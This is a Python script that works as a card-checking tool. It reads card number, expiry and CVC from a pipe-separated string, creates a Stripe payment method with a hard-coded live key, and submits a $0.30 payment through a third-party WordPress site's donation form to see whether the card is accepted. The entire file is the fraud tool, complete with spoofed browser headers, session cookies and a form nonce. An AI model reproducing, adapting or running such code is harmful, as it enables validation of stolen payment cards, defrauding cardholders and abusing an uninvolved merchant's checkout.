import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F8d64b7a725%3B+stripe-js-v3%2F8d64b7a725%3B+card-element&key=pk_live_51NuxgqC2AneYDXKanLwvYl8Cspp79OFUOiSjXh38AqvWODESU2pYey4w2tzLkj7gHMTZBqkDY5SRvxrMVZgyu8GD00ZWMYr5HX'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
	headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__wpdm_client': '40dc402560dbc364ff472137d506278a',
	    '__stripe_mid': 'ddd711e0-6ff4-434a-81c9-c10af46980e535950a',
	    '__stripe_sid': 'dbbadced-d0b1-4bf8-971f-0ce9242ad9cfab71af',
	}
	
	headers = {
	    'authority': 'www.thelegacyforge.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__wpdm_client=40dc402560dbc364ff472137d506278a; __stripe_mid=ddd711e0-6ff4-434a-81c9-c10af46980e535950a; __stripe_sid=dbbadced-d0b1-4bf8-971f-0ce9242ad9cfab71af',
	    'origin': 'https://www.thelegacyforge.com',
	    'referer': 'https://www.thelegacyforge.com/norflein/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1742023960281',
	}
	
	data = {
	    'data': 'item_6__fluent_sf=&__fluent_form_embded_post_id=16581&_fluentform_6_fluentformnonce=191ea14186&_wp_http_referer=%2Fnorflein%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&lcfgcoupon=&custom-payment-amount=0.30&payment_method=stripe&__ff_all_applied_coupons=&input_radio=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '6',
	}
	
	r2 = requests.post(
	    'https://www.thelegacyforge.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
